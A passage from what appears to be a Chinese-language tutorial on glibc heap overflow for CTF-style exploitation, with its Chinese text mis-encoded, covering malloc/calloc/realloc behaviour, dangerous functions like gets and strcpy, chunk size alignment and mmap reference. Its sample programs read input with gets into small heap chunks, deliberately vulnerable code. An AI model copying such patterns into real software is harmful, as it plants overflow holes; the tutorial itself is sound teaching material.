class="hljs-number">4141414141414141</span> &lt;===top chunk(å·²è¢«æº¢å‡º)<br><span class="hljs-attribute">0x602030</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">4141414141414141</span>	<span class="hljs-number">0</span>x<span class="hljs-number">4141414141414141</span><br><span class="hljs-attribute">0x602040</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">4141414141414141</span>	<span class="hljs-number">0</span>x<span class="hljs-number">4141414141414141</span><br></code></pre></td></tr></table></figure>


<h2 id="å°æ€»ç»“"><a href="#å°æ€»ç»“" class="headerlink" title="å°æ€»ç»“"></a>å°æ€»ç»“</h2><p>å †æº¢å‡ºä¸­æ¯”è¾ƒé‡è¦çš„å‡ ä¸ªæ­¥éª¤:</p>
<h3 id="å¯»æ‰¾å †åˆ†é…å‡½æ•°"><a href="#å¯»æ‰¾å †åˆ†é…å‡½æ•°" class="headerlink" title="å¯»æ‰¾å †åˆ†é…å‡½æ•°"></a>å¯»æ‰¾å †åˆ†é…å‡½æ•°</h3><p>é€šå¸¸æ¥è¯´å †æ˜¯é€šè¿‡è°ƒç”¨ glibc å‡½æ•° malloc è¿›è¡Œåˆ†é…çš„ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ä¼šä½¿ç”¨ calloc åˆ†é…ã€‚calloc ä¸ malloc çš„åŒºåˆ«æ˜¯ <strong>calloc åœ¨åˆ†é…åä¼šè‡ªåŠ¨è¿›è¡Œæ¸…ç©ºï¼Œè¿™å¯¹äºæŸäº›ä¿¡æ¯æ³„éœ²æ¼æ´çš„åˆ©ç”¨æ¥è¯´æ˜¯è‡´å‘½çš„</strong>ã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">calloc</span>(<span class="hljs-number">0x20</span>);<br><span class="hljs-comment">//ç­‰åŒäº</span><br>ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><span class="hljs-built_in">memset</span>(ptr,<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>);<br></code></pre></td></tr></table></figure>

<p>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€ç§åˆ†é…æ˜¯ç»ç”± realloc è¿›è¡Œçš„ï¼Œrealloc å‡½æ•°å¯ä»¥èº«å…¼ malloc å’Œ free ä¸¤ä¸ªå‡½æ•°çš„åŠŸèƒ½ã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> *chunk,*chunk1;<br>  chunk=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">16</span>);<br>  chunk1=<span class="hljs-built_in">realloc</span>(chunk,<span class="hljs-number">32</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>reallocçš„æ“ä½œå¹¶ä¸æ˜¯åƒå­—é¢æ„ä¹‰ä¸Šé‚£ä¹ˆç®€å•ï¼Œå…¶å†…éƒ¨ä¼šæ ¹æ®ä¸åŒçš„æƒ…å†µè¿›è¡Œä¸åŒæ“ä½œ</p>
<ul>
<li>å½“realloc(ptr,size)çš„sizeä¸ç­‰äºptrçš„sizeæ—¶<ul>
<li>å¦‚æœç”³è¯·size&gt;åŸæ¥size<ul>
<li>  å¦‚æœchunkä¸top chunkç›¸é‚»ï¼Œç›´æ¥æ‰©å±•è¿™ä¸ªchunkåˆ°æ–°sizeå¤§å°</li>
<li>  å¦‚æœchunkä¸top chunkä¸ç›¸é‚»ï¼Œç›¸å½“äºfree(ptr),malloc(new_size) </li>
</ul>
</li>
<li>å¦‚æœç”³è¯·size&lt;åŸæ¥size<ul>
<li>  å¦‚æœç›¸å·®ä¸è¶³ä»¥å®¹å¾—ä¸‹ä¸€ä¸ªæœ€å°chunk(64ä½ä¸‹32ä¸ªå­—èŠ‚ï¼Œ32ä½ä¸‹16ä¸ªå­—èŠ‚)ï¼Œåˆ™ä¿æŒä¸å˜</li>
<li>  å¦‚æœç›¸å·®å¯ä»¥å®¹å¾—ä¸‹ä¸€ä¸ªæœ€å°chunkï¼Œåˆ™åˆ‡å‰²åŸchunkä¸ºä¸¤éƒ¨åˆ†ï¼Œfreeæ‰åä¸€éƒ¨åˆ†</li>
</ul>
</li>
</ul>
</li>
<li>  å½“realloc(ptr,size)çš„sizeç­‰äº0æ—¶ï¼Œç›¸å½“äºfree(ptr)</li>
<li>  å½“realloc(ptr,size)çš„sizeç­‰äºptrçš„sizeï¼Œä¸è¿›è¡Œä»»ä½•æ“ä½œ</li>
</ul>
<h3 id="å¯»æ‰¾å±é™©å‡½æ•°"><a href="#å¯»æ‰¾å±é™©å‡½æ•°" class="headerlink" title="å¯»æ‰¾å±é™©å‡½æ•°"></a>å¯»æ‰¾å±é™©å‡½æ•°</h3><p>é€šè¿‡å¯»æ‰¾å±é™©å‡½æ•°ï¼Œæˆ‘ä»¬å¿«é€Ÿç¡®å®šç¨‹åºæ˜¯å¦å¯èƒ½æœ‰å †æº¢å‡ºï¼Œä»¥åŠæœ‰çš„è¯ï¼Œå †æº¢å‡ºçš„ä½ç½®åœ¨å“ªé‡Œã€‚</p>
<p>å¸¸è§çš„å±é™©å‡½æ•°å¦‚ä¸‹</p>
<ul>
<li>è¾“å…¥<ul>
<li>  getsï¼Œç›´æ¥è¯»å–ä¸€è¡Œï¼Œå¿½ç•¥ <code>&#39;\x00&#39;</code></li>
<li>  scanf</li>
<li>  vscanf</li>
</ul>
</li>
<li>è¾“å‡º<ul>
<li>  sprintf</li>
</ul>
</li>
<li>å­—ç¬¦ä¸²<ul>
<li>  strcpyï¼Œå­—ç¬¦ä¸²å¤åˆ¶ï¼Œé‡åˆ° <code>&#39;\x00&#39;</code> åœæ­¢</li>
<li>  strcatï¼Œå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œé‡åˆ° <code>&#39;\x00&#39;</code> åœæ­¢</li>
<li>  bcopyï¼Œå°†å­—ç¬¦ä¸²srcçš„å‰nä¸ªå­—èŠ‚å¤åˆ¶åˆ°destä¸­ï¼Œå¹¶ä¸”ä¸æ£€æŸ¥â€™\x00â€™</li>
</ul>
</li>
</ul>
<h3 id="ç¡®å®šå¡«å……é•¿åº¦"><a href="#ç¡®å®šå¡«å……é•¿åº¦" class="headerlink" title="ç¡®å®šå¡«å……é•¿åº¦"></a>ç¡®å®šå¡«å……é•¿åº¦</h3><p>è¿™ä¸€éƒ¨åˆ†ä¸»è¦æ˜¯è®¡ç®—<strong>æˆ‘ä»¬å¼€å§‹å†™å…¥çš„åœ°å€ä¸æˆ‘ä»¬æ‰€è¦è¦†ç›–çš„åœ°å€ä¹‹é—´çš„è·ç¦»</strong>ã€‚<br>ä¸€ä¸ªå¸¸è§çš„è¯¯åŒºæ˜¯mallocçš„å‚æ•°ç­‰äºå®é™…åˆ†é…å †å—çš„å¤§å°ï¼Œä½†æ˜¯äº‹å®ä¸Š ptmalloc åˆ†é…å‡ºæ¥çš„å¤§å°æ˜¯å¯¹é½çš„ã€‚è¿™ä¸ªé•¿åº¦ä¸€èˆ¬æ˜¯å­—é•¿çš„2å€ï¼Œæ¯”å¦‚32ä½ç³»ç»Ÿæ˜¯8ä¸ªå­—èŠ‚ï¼Œ64ä½ç³»ç»Ÿæ˜¯16ä¸ªå­—èŠ‚ã€‚ä½†æ˜¯å¯¹äºä¸å¤§äº2å€å­—é•¿çš„è¯·æ±‚ï¼Œmallocä¼šç›´æ¥è¿”å›2å€å­—é•¿çš„å—ä¹Ÿå°±æ˜¯æœ€å°chunkï¼Œæ¯”å¦‚64ä½ç³»ç»Ÿæ‰§è¡Œ<code>malloc(0)</code>ä¼šè¿”å›ç”¨æˆ·åŒºåŸŸä¸º16å­—èŠ‚çš„å—ã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> *chunk;<br>  chunk=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Get input:&quot;</span>);<br>  <span class="hljs-built_in">gets</span>(chunk);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight dns"><table><tr><td class="code"><pre><code class="hljs dns">//æ ¹æ®ç³»ç»Ÿçš„ä½æ•°ï¼Œmallocä¼šåˆ†é…<span class="hljs-number">8</span>æˆ–<span class="hljs-number">16</span>å­—èŠ‚çš„ç”¨æˆ·ç©ºé—´<br><span class="hljs-number">0x602000</span>:	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><br><span class="hljs-number">0x602010</span>:	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602020</span>:	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>	<span class="hljs-number">0</span>x0000000000020fe1<br><span class="hljs-number">0x602030</span>:	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure>

<p>æ³¨æ„ç”¨æˆ·åŒºåŸŸçš„å¤§å°ä¸ç­‰äº chunk_hear.sizeï¼Œchunk_hear.size=ç”¨æˆ·åŒºåŸŸå¤§å°+2*å­—é•¿</p>
<p>è¿˜æœ‰ä¸€ç‚¹æ˜¯ä¹‹å‰æ‰€è¯´çš„ç”¨æˆ·ç”³è¯·çš„å†…å­˜å¤§å°ä¼šè¢«ä¿®æ”¹ï¼Œå…¶æœ‰å¯èƒ½ä¼šä½¿ç”¨ä¸å…¶ç‰©ç†ç›¸é‚»çš„ä¸‹ä¸€ä¸ªchunkçš„prev_sizeå­—æ®µå‚¨å­˜å†…å®¹ã€‚å›å¤´å†æ¥çœ‹ä¸‹ä¹‹å‰çš„ç¤ºä¾‹ä»£ç </p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> *chunk;<br>  chunk=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">24</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Get input:&quot;</span>);<br>  <span class="hljs-built_in">gets</span>(chunk);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è§‚å¯Ÿå¦‚ä¸Šä»£ç ï¼Œæˆ‘ä»¬ç”³è¯·çš„chunkå¤§å°æ˜¯24ä¸ªå­—èŠ‚ã€‚ä½†æ˜¯æˆ‘ä»¬å°†å…¶ç¼–è¯‘ä¸º64ä½å¯æ‰§è¡Œç¨‹åºæ—¶ï¼Œå®é™…ä¸Šåˆ†é…çš„å†…å­˜ä¼šæ˜¯16ä¸ªå­—èŠ‚è€Œä¸æ˜¯24ä¸ªã€‚</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x602000</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000021</span><br><span class="hljs-attribute">0x602010</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span><br><span class="hljs-attribute">0x602020</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000020</span>fe<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p>16ä¸ªå­—èŠ‚çš„ç©ºé—´æ˜¯å¦‚ä½•è£…å¾—ä¸‹24ä¸ªå­—èŠ‚çš„å†…å®¹å‘¢ï¼Ÿç­”æ¡ˆæ˜¯å€Ÿç”¨äº†ä¸‹ä¸€ä¸ªå—çš„pre_sizeåŸŸã€‚æˆ‘ä»¬å¯æ¥çœ‹ä¸€ä¸‹ç”¨æˆ·ç”³è¯·çš„å†…å­˜å¤§å°ä¸glibcä¸­å®é™…åˆ†é…çš„å†…å­˜å¤§å°ä¹‹é—´çš„è½¬æ¢ã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* pad request bytes into a usable size -- internal version */</span><br><span class="hljs-comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> request2size(req)                                                      \</span><br><span class="hljs-meta">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span><br><span class="hljs-meta">         ? MINSIZE                                                             \</span><br><span class="hljs-meta">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br></code></pre></td></tr></table></figure>

<p>å½“req=24æ—¶ï¼Œrequest2size(24)=32ã€‚è€Œé™¤å»chunk å¤´éƒ¨çš„16ä¸ªå­—èŠ‚ã€‚å®é™…ä¸Šç”¨æˆ·å¯ç”¨chunkçš„å­—èŠ‚æ•°ä¸º16ã€‚è€Œæ ¹æ®æˆ‘ä»¬å‰é¢å­¦åˆ°çš„çŸ¥è¯†å¯ä»¥çŸ¥é“chunkçš„pre_sizeä»…å½“å®ƒçš„å‰ä¸€å—å¤„äºé‡Šæ”¾çŠ¶æ€æ—¶æ‰èµ·ä½œç”¨ã€‚æ‰€ä»¥ç”¨æˆ·è¿™æ—¶å€™å…¶å®è¿˜å¯ä»¥ä½¿ç”¨ä¸‹ä¸€ä¸ªchunkçš„prev_sizeå­—æ®µï¼Œæ­£å¥½24ä¸ªå­—èŠ‚ã€‚<strong>å®é™…ä¸Š ptmalloc åˆ†é…å†…å­˜æ˜¯ä»¥åŒå­—ä¸ºåŸºæœ¬å•ä½ï¼Œä»¥64ä½ç³»ç»Ÿä¸ºä¾‹ï¼Œåˆ†é…å‡ºæ¥çš„ç©ºé—´æ˜¯16çš„æ•´æ•°å€ï¼Œå³ç”¨æˆ·ç”³è¯·çš„chunkéƒ½æ˜¯16å­—èŠ‚å¯¹é½çš„ã€‚</strong></p>
<h2 id="ç›¸å…³å‡½æ•°çŸ¥è¯†"><a href="#ç›¸å…³å‡½æ•°çŸ¥è¯†" class="headerlink" title="ç›¸å…³å‡½æ•°çŸ¥è¯†"></a>ç›¸å…³å‡½æ•°çŸ¥è¯†</h2><p>1ã€<strong>mmap</strong></p>
<p>å‡½æ•°åŸå‹ä¸º<em><em>void</em> mmap(void</em> start,size_t length,int prot,int flags,int fd,off_t offset)**  åŠŸèƒ½ä¸ºï¼šmmapå°†ä¸€ä¸ªæ–‡ä»¶æˆ–è€…å…¶å®ƒå¯¹è±¡æ˜ å°„è¿›å†…å­˜ã€‚æ–‡ä»¶è¢«<strong>æ˜ å°„</strong>åˆ°å¤šä¸ªé¡µä¸Šï¼Œå¦‚æœæ–‡ä»¶çš„å¤§å°ä¸æ˜¯æ‰€æœ‰é¡µçš„å¤§å°ä¹‹å’Œï¼Œæœ€åä¸€ä¸ªé¡µå‰©ä¸‹çš„ç©ºé—´ï¼ˆæœªä½¿ç”¨çš„ï¼‰å°†ä¼šæ¸…é›¶ã€‚mmapåˆ›å»ºçš„chunkç´§é‚»libc</p>
<p>æ¡ä»¶ï¼šmmap()å¿…é¡»ä»¥PAGE_SIZEä¸ºå•ä½è¿›è¡Œæ˜ å°„ï¼Œè€Œå†…å­˜ä¹Ÿåªèƒ½ä»¥é¡µä¸ºå•ä½ï¼ˆ32ä½ç³»ç»Ÿä¸­é¡µä¸º4kå­—èŠ‚ï¼‰è¿›è¡Œæ˜ å°„ï¼Œè‹¥è¦æ˜ å°„éPAGE_SIZEæ•´æ•°å€çš„åœ°å€èŒƒå›´ï¼Œè¦å…ˆè¿›è¡Œå†…å­˜å¯¹é½ï¼Œå¼ºè¡Œä»¥PAGE_SIZEçš„å€æ•°å¤§å°è¿›è¡Œæ˜ å°„ã€‚</p>
<p>å‚æ•°è¯´æ˜ï¼š</p>
<p>startï¼šæ˜ å°„åŒºçš„å¼€å§‹åœ°å€ï¼Œè®¾ç½®ä¸º0æ—¶è¡¨ç¤ºç”±ç³»ç»Ÿå†³å®šæ˜ å°„åŒºçš„èµ·å§‹åœ°å€ã€‚</p>
<p>lengthï¼šæ˜ å°„åŒºçš„é•¿åº¦ã€‚//é•¿åº¦å•ä½æ˜¯ ä»¥å­—èŠ‚ä¸ºå•ä½ï¼Œä¸è¶³ä¸€å†…å­˜é¡µæŒ‰ä¸€å†…å­˜é¡µå¤„ç†</p>
<p>protï¼šæœŸæœ›çš„å†…å­˜ä¿æŠ¤æ ‡å¿—ï¼Œä¸èƒ½ä¸æ–‡ä»¶çš„æ‰“å¼€æ¨¡å¼å†²çªã€‚æ˜¯ä»¥ä¸‹çš„æŸä¸ªå€¼ï¼Œå¯ä»¥é€šè¿‡orè¿ç®—åˆç†åœ°ç»„åˆåœ¨ä¸€èµ·</p>
<p>PROT_EXEC //é¡µå†…å®¹å¯ä»¥è¢«æ‰§è¡Œï¼ˆå€¼ä¸º1ï¼‰</p>
<p>PROT_READ //é¡µå†…å®¹å¯ä»¥è¢«è¯»å–ï¼ˆå€¼ä¸º4ï¼‰</p>
<p>PROT_WRITE //é¡µå¯ä»¥è¢«å†™å…¥ï¼ˆå€¼ä¸º2ï¼‰</p>
<p>PROT_NONE //é¡µä¸å¯è®¿é—®</p>
<p>flagsï¼šæŒ‡å®šæ˜ å°„å¯¹è±¡çš„ç±»å‹ï¼Œæ˜ å°„é€‰é¡¹å’Œæ˜ å°„é¡µæ˜¯å¦å¯ä»¥å…±äº«ã€‚å®ƒçš„å€¼å¯ä»¥æ˜¯ä¸€ä¸ªæˆ–è€…å¤šä¸ªä»¥ä¸‹ä½çš„ç»„åˆä½“ï¼š</p>
<p>MAP_FIXED //ä½¿ç”¨æŒ‡å®šçš„æ˜ å°„èµ·å§‹åœ°å€ï¼Œå¦‚æœç”±startå’Œlenå‚æ•°æŒ‡å®šçš„å†…å­˜åŒºé‡å äºç°å­˜çš„æ˜ å°„ç©ºé—´ï¼Œé‡å éƒ¨åˆ†å°†ä¼šè¢«ä¸¢å¼ƒã€‚å¦‚æœæŒ‡å®šçš„èµ·å§‹åœ°å€ä¸å¯ç”¨ï¼Œæ“ä½œå°†ä¼šå¤±è´¥ã€‚å¹¶ä¸”èµ·å§‹åœ°å€å¿…é¡»è½åœ¨é¡µçš„è¾¹ç•Œä¸Šã€‚</p>
<p>MAP_SHARED //ä¸å…¶å®ƒæ‰€æœ‰æ˜ å°„è¿™ä¸ªå¯¹è±¡çš„è¿›ç¨‹å…±äº«æ˜ å°„ç©ºé—´ã€‚å¯¹å…±äº«åŒºçš„å†™å…¥ï¼Œç›¸å½“äºè¾“å‡ºåˆ°æ–‡ä»¶ã€‚ç›´åˆ°**msync()<strong>æˆ–è€…</strong>munmap()**è¢«è°ƒç”¨ï¼Œæ–‡ä»¶å®é™…ä¸Šä¸ä¼šè¢«æ›´æ–°ã€‚</p>
<p>MAP_PRIVATE //å»ºç«‹ä¸€ä¸ªå†™å…¥æ—¶æ‹·è´çš„ç§æœ‰æ˜ å°„ã€‚å†…å­˜åŒºåŸŸçš„å†™å…¥ä¸ä¼šå½±å“åˆ°åŸæ–‡ä»¶ã€‚è¿™ä¸ªæ ‡å¿—å’Œä»¥ä¸Šæ ‡å¿—æ˜¯äº’æ–¥çš„ï¼Œåªèƒ½ä½¿ç”¨å…¶ä¸­ä¸€ä¸ªã€‚</p>
<p>MAP_DENYWRITE //è¿™ä¸ªæ ‡å¿—è¢«å¿½ç•¥ã€‚</p>
<p>MAP_EXECUTABLE //åŒä¸Š</p>
<p>MAP_NORESERVE //ä¸è¦ä¸ºè¿™ä¸ªæ˜ å°„ä¿ç•™äº¤æ¢ç©ºé—´ã€‚å½“äº¤æ¢ç©ºé—´è¢«ä¿ç•™ï¼Œå¯¹æ˜ å°„åŒºä¿®æ”¹çš„å¯èƒ½ä¼šå¾—åˆ°ä¿è¯ã€‚å½“äº¤æ¢ç©ºé—´ä¸è¢«ä¿ç•™ï¼ŒåŒæ—¶å†…å­˜ä¸è¶³ï¼Œå¯¹æ˜ å°„åŒºçš„ä¿®æ”¹ä¼šå¼•èµ·æ®µè¿ä¾‹ä¿¡å·ã€‚</p>
<p>MAP_LOCKED //é”å®šæ˜ å°„åŒºçš„é¡µé¢ï¼Œä»è€Œé˜²æ­¢é¡µé¢è¢«äº¤æ¢å‡ºå†…å­˜ã€‚</p>
<p>MAP_GROWSDOWN //ç”¨äºå †æ ˆï¼Œå‘Šè¯‰å†…æ ¸VMç³»ç»Ÿï¼Œæ˜ å°„åŒºå¯ä»¥å‘ä¸‹æ‰©å±•ã€‚</p>
<p>MAP_ANONYMOUS //åŒ¿åæ˜ å°„ï¼Œæ˜ å°„åŒºä¸ä¸ä»»ä½•æ–‡ä»¶å…³è”ã€‚</p>
<p>MAP_ANON //MAP_ANONYMOUSçš„åˆ«ç§°ï¼Œä¸å†è¢«ä½¿ç”¨ã€‚</p>
<p>MAP_FILE //å…¼å®¹æ ‡å¿—ï¼Œè¢«å¿½ç•¥ã€‚</p>
<p>MAP_32BIT //å°†æ˜ å°„åŒºæ”¾åœ¨è¿›ç¨‹åœ°å€ç©ºé—´çš„ä½2GBï¼ŒMAP_FIXEDæŒ‡å®šæ—¶ä¼šè¢«å¿½ç•¥ã€‚å½“å‰è¿™ä¸ªæ ‡å¿—åªåœ¨x86-64å¹³å°ä¸Šå¾—åˆ°æ”¯æŒã€‚</p>
<p>MAP_POPULATE //ä¸ºæ–‡ä»¶æ˜ å°„é€šè¿‡é¢„è¯»çš„æ–¹å¼å‡†å¤‡å¥½é¡µè¡¨ã€‚éšåå¯¹æ˜ å°„åŒºçš„è®¿é—®ä¸ä¼šè¢«é¡µè¿ä¾‹é˜»å¡ã€‚</p>
<p>MAP_NONBLOCK //ä»…å’ŒMAP_POPULATEä¸€èµ·ä½¿ç”¨æ—¶æ‰æœ‰æ„ä¹‰ã€‚ä¸æ‰§è¡Œé¢„è¯»ï¼Œåªä¸ºå·²å­˜åœ¨äºå†…å­˜ä¸­çš„é¡µé¢å»ºç«‹é¡µè¡¨å…¥å£ã€‚</p>
<p>fdï¼šæœ‰æ•ˆçš„æ–‡ä»¶æè¿°è¯ã€‚ä¸€èˆ¬æ˜¯ç”±**open()**å‡½æ•°è¿”å›ï¼Œå…¶å€¼å¯ä»¥è®¾ç½®ä¸º-1ï¼Œæ­¤æ—¶éœ€è¦æŒ‡å®šflagså‚æ•°ä¸­çš„MAP_ANONYMOUSï¼Œè¡¨æ˜è¿›è¡Œçš„æ˜¯åŒ¿åæ˜ å°„ã€‚</p>
<p>offsetï¼šè¢«æ˜ å°„å¯¹è±¡å†…å®¹çš„èµ·ç‚¹ã€‚</p>
<p>æˆåŠŸæ‰§è¡Œæ—¶ï¼Œmmap()è¿”å›è¢«æ˜ å°„åŒºçš„æŒ‡é’ˆï¼Œmunmap()è¿”å›0ã€‚å¤±è´¥æ—¶ï¼Œmmap()è¿”å›MAP_FAILED[å…¶å€¼ä¸º(void *)-1]ï¼Œmunmapè¿”å›-1ã€‚</p>
<p>æ³¨ï¼šï¼ˆï¼ˆvoid*ï¼‰-1ï¼‰ ï¼šä¸€ä¸ªæŸç±»å‹æŒ‡é’ˆç±»å‹ï¼ŒæŒ‡å‘åœ°å€ä¸º0xffffffffï¼Œæ— æ•ˆåœ°å€ï¼Œè¡¨æ˜é”™è¯¯</p>
<p>æ˜ å°„å»ºç«‹ä¹‹åï¼Œå³ä½¿æ–‡ä»¶å…³é—­ï¼Œæ˜ å°„ä¾ç„¶å­˜åœ¨ã€‚å› ä¸ºæ˜ å°„çš„æ˜¯ç£ç›˜çš„åœ°å€ï¼Œä¸æ˜¯æ–‡ä»¶æœ¬èº«ï¼Œå’Œæ–‡ä»¶å¥æŸ„æ— å…³ã€‚åŒæ—¶å¯ç”¨äºè¿›ç¨‹é—´é€šä¿¡çš„æœ‰æ•ˆåœ°å€ç©ºé—´ä¸å®Œå…¨å—é™äºè¢«æ˜ å°„æ–‡ä»¶çš„å¤§å°ï¼Œå› ä¸ºæ˜¯æŒ‰é¡µæ˜ å°„ã€‚</p>
<p>2ã€<strong>munmap</strong></p>
<p>å‡½æ•°åŸå‹ä¸º<em><em>int munmap(void</em> start,size_t length)</em>* ç”¨æ¥å–æ¶ˆå‚æ•°startæ‰€æŒ‡çš„æ˜ å°„å†…å­˜èµ·å§‹åœ°å€ï¼Œå‚æ•°lengthåˆ™æ˜¯æ¬²å–æ¶ˆçš„å†…å­˜å¤§å°ã€‚å½“è¿›ç¨‹ç»“æŸæˆ–åˆ©ç”¨execç›¸å…³å‡½æ•°æ¥æ‰§è¡Œå…¶ä»–ç¨‹åºæ—¶ï¼Œæ˜ å°„å†…å­˜ä¼šè‡ªåŠ¨è§£é™¤ï¼Œä½†å…³é—­å¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦æ—¶ä¸ä¼šè§£é™¤æ˜ å°„ã€‚</p>
<p>addræ˜¯è°ƒç”¨mmap()æ—¶è¿”å›çš„åœ°å€ï¼Œlenæ˜¯æ˜ å°„åŒºçš„å¤§å°ï¼›å½“æ˜ å°„å…³ç³»è§£é™¤åï¼Œå¯¹åŸæ¥æ˜ å°„åœ°å€çš„è®¿é—®å°†å¯¼è‡´æ®µé”™è¯¯å‘ç”Ÿã€‚ </p>
<p>3ã€<strong>msync</strong></p>
<p>å‡½æ•°åŸå‹ä¸º**int msync( void *addr, size_t len, int flags )**ï¼Œä¸€èˆ¬è¯´æ¥ï¼Œè¿›ç¨‹åœ¨æ˜ å°„ç©ºé—´çš„å¯¹å…±äº«å†…å®¹çš„æ”¹å˜å¹¶ä¸ç›´æ¥å†™å›åˆ°ç£ç›˜æ–‡ä»¶ä¸­ï¼Œå¾€å¾€åœ¨è°ƒç”¨munmapï¼ˆï¼‰åæ‰æ‰§è¡Œè¯¥æ“ä½œã€‚</p>
<p>å¯ä»¥é€šè¿‡è°ƒç”¨msync()å®ç°ç£ç›˜ä¸Šæ–‡ä»¶å†…å®¹ä¸å…±äº«å†…å­˜åŒºçš„å†…å®¹ä¸€è‡´ã€‚</p>
<p>4ã€<strong>malloc</strong></p>
<p>å‡½æ•°åŸå‹ä¸º**void *malloc(unsigned int size)**ï¼›å…¶ä½œç”¨æ˜¯åœ¨å†…å­˜çš„åŠ¨æ€å­˜å‚¨åŒºä¸­åˆ†é…ä¸€ä¸ªé•¿åº¦ä¸ºsizeçš„è¿ç»­ç©ºé—´ã€‚æ­¤å‡½æ•°çš„è¿”å›å€¼æ˜¯åˆ†é…åŒºåŸŸçš„èµ·å§‹åœ°å€ï¼Œæˆ–è€…è¯´ï¼Œæ­¤å‡½æ•°æ˜¯ä¸€ä¸ªæŒ‡é’ˆå‹å‡½æ•°ï¼Œè¿”å›çš„æŒ‡é’ˆæŒ‡å‘è¯¥åˆ†é…åŸŸçš„å¼€å¤´ä½ç½®ã€‚</p>
<p>åˆ†é…æˆåŠŸåˆ™è¿”å›æŒ‡å‘è¢«åˆ†é…å†…å­˜çš„æŒ‡é’ˆ(æ­¤å­˜å‚¨åŒºä¸­çš„åˆå§‹å€¼ä¸ç¡®å®š)ï¼Œå¦åˆ™è¿”å›ç©ºæŒ‡é’ˆNULLã€‚å½“åŠ¨æ€å†…å­˜ä¸å†ä½¿ç”¨æ—¶ï¼Œåº”ä½¿ç”¨free()å‡½æ•°å°†å†…å­˜å—é‡Šæ”¾ã€‚</p>
<ul>
<li>å½“ size=0 æ—¶ï¼Œè¿”å›å½“å‰ç³»ç»Ÿå…è®¸çš„å †çš„æœ€å°å†…å­˜å—ã€‚</li>
<li>å½“ size ä¸ºè´Ÿæ•°æ—¶ï¼Œç”±äºåœ¨å¤§å¤šæ•°ç³»ç»Ÿä¸Šï¼Œ<strong>size_t æ˜¯æ— ç¬¦å·æ•°ï¼ˆè¿™ä¸€ç‚¹éå¸¸é‡è¦ï¼‰</strong>ï¼Œæ‰€ä»¥ç¨‹åºå°±ä¼šç”³è¯·å¾ˆå¤§çš„å†…å­˜ç©ºé—´ï¼Œä½†é€šå¸¸æ¥è¯´éƒ½ä¼šå¤±è´¥ï¼Œå› ä¸ºç³»ç»Ÿæ²¡æœ‰é‚£ä¹ˆå¤šçš„å†…å­˜å¯ä»¥åˆ†é…ã€‚</li>
</ul>
<p>5ã€<strong>free</strong></p>
